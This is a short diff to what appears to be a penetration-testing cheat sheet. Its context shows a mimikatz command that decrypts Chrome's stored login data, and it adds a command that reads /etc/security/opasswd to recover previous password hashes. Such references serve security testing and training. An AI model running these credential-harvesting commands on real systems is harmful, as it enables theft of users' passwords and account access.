@@ -1126,6 +1126,12 @@ C:\> mimikatz.exe
 mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
 ```
 
+- Opasswd previous passwords
+
+```
+$ sudo cat /etc/security/opasswd
+```
+
 #8. - File Transfers
 -----------------------------------------
 
